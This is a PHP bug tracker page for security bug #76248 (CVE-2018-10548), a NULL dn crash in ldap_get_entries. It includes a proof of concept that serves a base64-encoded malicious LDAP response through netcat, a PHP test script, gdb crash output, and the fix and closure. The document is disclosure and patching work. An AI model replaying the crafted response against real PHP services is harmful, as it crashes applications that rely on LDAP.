<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='LDAP related Bug #76248 - RDF' href='rss/bug.php?id=76248'>
        <link rel='alternate' type='application/rss+xml' title='LDAP related Bug #76248 - RSS 2.0' href='rss/bug.php?id=76248&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #76248 :: Malicious LDAP-Server Response causes Crash</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=76248">Sec Bug</a>&nbsp;#76248</th>
            <td id="summary" colspan="5">Malicious LDAP-Server Response causes Crash</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2018-04-21 20:48 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2018-04-29 20:48 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>phpldap &#x61;&#116; katzen &#x64;&#111;&#x74; cc</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=LDAP+related">LDAP related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>7.2.4</td>
            <th class="details">OS:</th>
            <td></td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10548" target="_blank">2018-10548</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=76248&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=76248&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=76248&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1524343703">&nbsp;</a><strong>[2018-04-21 20:48 UTC] phpldap &#x61;&#116; katzen &#x64;&#111;&#x74; cc</strong>
<pre class='note'>Description:
------------
A bug in the LDAP module of PHP allows a malicious LDAP server or man-in-the-middle attacker to crash PHP. The issue has a low impact as it can’t be exploited beyond a crash. The only scenario where this problem can be exploited is when a web server writes coredumps into the web directory. However, such a misconfiguration isn’t that uncommon, thus I’m flagging this as sec-bug.  

While receiving the server response via ldap_get_entries the current dn is retrieved using ldap_get_dn(). A specially crafted server response can cause ldap_get_dn() to return a NULL pointer which causes a crash in ldap_get_entries() because add_assoc_string() can’t handle NULL pointers.

Affected Code:
ext/ldap/ldap.c

PHP_FUNCTION(ldap_get_entries)
[...]
dn = ldap_get_dn(ldap, ldap_result_entry);
add_assoc_string(&amp;tmp1, &quot;dn&quot;, dn);

PoC:
Run:
echo MAwCAQFhBwoBAAQABAAweQIBAmR0BJljbj1yb290LGRjPWV4YW1wbGUsZGM9Y29tMFcwIwQLb2JqZWN0Q2xhc3MxFAQSb3JnYW5pemF0aW9uYWxSb2xlMAwEAmNuMQYEBHJvb3QwIgQLZGVzY3JpcHRpb24xEwQRRGlyZWN0b3J5IE1hbmFnZXIwDAIBAmUHCgEABAAEADB5AgEDZHQEmWNuPXJvb3QsZGM9ZXhhbXBsZSxkYz1jb20wVzAjBAtvYmplY3RDbGFzczEUBBJvcmdhbml6YXRpb25hbFJvbGUwDAQCY24xBgQEcm9vdDAiBAtkZXNjcmlwdGlvbjETBBFEaXJlY3RvcnkgTWFuYWdlcjAMAgEDZQcKAQAEAAQA | base64 -d | nc -lvp 1234

Then execute:
./sapi/cli/php ldap.php


Suggested fix:
Assign an empty string to dn if ldap_get_dn() returns NULL. 



Test script:
---------------
&lt;?php

$ds = ldap_connect(&quot;127.0.0.1&quot;, 1234);
ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3);
$b = ldap_bind($ds, &quot;cn=root,dc=example,dc=com&quot;, &quot;secret&quot;);

$s = ldap_search($ds, &quot;dc=example,dc=com&quot;, &quot;(cn=root)&quot;); 
$tt = ldap_get_entries($ds, $s);


Expected result:
----------------
No crash

Actual result:
--------------
gdb-peda$ r ldap2.php 
Starting program: /home/bla/php-7.2.4/sapi/cli/php ldap2.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/usr/lib/libthread_db.so.1&quot;.

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7ffff7fc323c --&gt; 0xf7fc324000000606 
RBX: 0x7fffffffb260 --&gt; 0x5555571b0e30 --&gt; 0x800700000001 
RCX: 0x0 
RDX: 0x0 
RSI: 0x555556b69084 --&gt; 0x5f7061646c006e64 ('dn')
RDI: 0x0 
RBP: 0x5555571b0b90 --&gt; 0x2 
RSP: 0x7fffffffb1b8 --&gt; 0x5555562daa9e (&lt;add_assoc_string_ex+94&gt;:	mov    rbx,rax)
RIP: 0x7ffff27c8f11 (&lt;__strlen_avx2+17&gt;:	vpcmpeqb ymm1,ymm0,YMMWORD PTR [rdi])
R8 : 0x5555571b08b7 (&quot;cn=root,dc=example,dc=com0W0#\004\vobjectClass1\024\004\022organizationalRole0\f\004\002cn1\006\004\004root0\&quot;\004\vdescription1\023\004\021Directory Manager&quot;)
R9 : 0x18 
R10: 0x1f4 
R11: 0x7ffff6e8de80 (&lt;ldap_get_dn&gt;:	push   rbp)
R12: 0x555556b69084 --&gt; 0x5f7061646c006e64 ('dn')
R13: 0x0 
R14: 0x2 
R15: 0x7fffffffb260 --&gt; 0x5555571b0e30 --&gt; 0x800700000001
EFLAGS: 0x10283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff27c8f09 &lt;__strlen_avx2+9&gt;:	and    ecx,0x3f
   0x7ffff27c8f0c &lt;__strlen_avx2+12&gt;:	cmp    ecx,0x20
   0x7ffff27c8f0f &lt;__strlen_avx2+15&gt;:	ja     0x7ffff27c8f30 &lt;__strlen_avx2+48&gt;
=&gt; 0x7ffff27c8f11 &lt;__strlen_avx2+17&gt;:	vpcmpeqb ymm1,ymm0,YMMWORD PTR [rdi]
   0x7ffff27c8f15 &lt;__strlen_avx2+21&gt;:	vpmovmskb eax,ymm1
   0x7ffff27c8f19 &lt;__strlen_avx2+25&gt;:	test   eax,eax
   0x7ffff27c8f1b &lt;__strlen_avx2+27&gt;:	jne    0x7ffff27c9000 &lt;__strlen_avx2+256&gt;
   0x7ffff27c8f21 &lt;__strlen_avx2+33&gt;:	add    rdi,0x20
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffb1b8 --&gt; 0x5555562daa9e (&lt;add_assoc_string_ex+94&gt;:	mov    rbx,rax)
0008| 0x7fffffffb1c0 --&gt; 0x5555571b08b0 --&gt; 0x6399047464020102 
0016| 0x7fffffffb1c8 --&gt; 0x5555571b08b5 --&gt; 0x6f6f723d6e639904 
0024| 0x7fffffffb1d0 --&gt; 0x5555571b0929 --&gt; 0x0 
0032| 0x7fffffffb1d8 --&gt; 0x0 
0040| 0x7fffffffb1e0 --&gt; 0x33d64e4403b75f00 
0048| 0x7fffffffb1e8 --&gt; 0x7fffffffb260 --&gt; 0x5555571b0e30 --&gt; 0x800700000001 
0056| 0x7fffffffb1f0 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007ffff27c8f11 in __strlen_avx2 () from /usr/lib/libc.so.6
gdb-peda$ bt
#0  0x00007ffff27c8f11 in __strlen_avx2 () from /usr/lib/libc.so.6
#1  0x00005555562daa9e in add_assoc_string_ex (arg=0x7fffffffb260, key=0x555556b69084 &quot;dn&quot;, key_len=0x2, str=0x0) at Zend/zend_API.c:1414
#2  0x0000555555d1647b in zif_ldap_get_entries (execute_data=&lt;optimized out&gt;, return_value=0x7ffff1bc1170) at ext/ldap/ldap.c:1251
#3  0x0000555556508c59 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER (execute_data=0x7ffff1bc1040) at Zend/zend_vm_execute.h:617
#4  0x00005555563b096f in execute_ex (ex=0x7ffff1bc1040) at Zend/zend_vm_execute.h:59723
#5  0x00005555563b0f10 in zend_execute (op_array=0x5555571b1e90, return_value=0x0) at Zend/zend_vm_execute.h:63760
#6  0x00005555562cd271 in zend_execute_scripts (type=&lt;optimized out&gt;, retval=0x0, file_count=0x3) at Zend/zend.c:1496
#7  0x00005555561835ce in php_execute_script (primary_file=0x7fffffffd7b0) at main/main.c:2590
#8  0x00005555565bda23 in do_cli (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at sapi/cli/php_cli.c:1011
#9  0x00005555565bb966 in main (argc=0x2, argv=&lt;optimized out&gt;) at sapi/cli/php_cli.c:1404
#10 0x00007ffff2692f4a in __libc_start_main () from /usr/lib/libc.so.6
#11 0x000055555568676a in _start ()

</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=76248'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=76248'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1524458135">&nbsp;</a><strong>[2018-04-23 04:35 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status:      Open</span>
<span class="added">+Status:      Assigned</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1524458135">&nbsp;</a><strong>[2018-04-23 04:35 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>While this does not seem to be directly exploitable, crash caused by external user data in common scenario seems to be bad enough to treat it as a security issue.
</pre>
</div><div class='comment type_log' ><a name="1524459780">&nbsp;</a><strong>[2018-04-23 05:03 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: needed</span>
</div></div></div><div class='comment type_comment' ><a name="1524459780">&nbsp;</a><strong>[2018-04-23 05:03 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Fix in security repo as 49782c54994ecca2ef2a061063bd5a7079c43527 and in <a href="https://gist.github.com/smalyshev/7f69d73b24e149704b90f1fc7786915d" rel="nofollow">https://gist.github.com/smalyshev/7f69d73b24e149704b90f1fc7786915d</a>, Please verify.
</pre>
</div><div class='comment type_comment' ><a name="1524480426">&nbsp;</a><strong>[2018-04-23 10:47 UTC] phpldap &#x61;&#116; katzen &#x64;&#111;&#x74; cc</strong>
<pre class='note'>Looks good to me
</pre>
</div><div class='comment type_log' ><a name="1524546798">&nbsp;</a><strong>[2018-04-24 05:13 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_comment' ><a name="1524546798">&nbsp;</a><strong>[2018-04-24 05:13 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The fix for this bug has been committed.

Snapshots of the sources are packaged every three hours; this change
will be in the next snapshot. You can grab the snapshot at
<a href="http://snaps.php.net/" rel="nofollow">http://snaps.php.net/</a>.

 For Windows:

<a href="http://windows.php.net/snapshots/" rel="nofollow">http://windows.php.net/snapshots/</a>
 
Thank you for the report, and for helping us make PHP better.


</pre>
</div><div class='comment type_log' ><a name="1525034892">&nbsp;</a><strong>[2018-04-29 20:48 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID: needed</span>
<span class="added">+CVE-ID: 2018-10548</span>
</div></div></div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
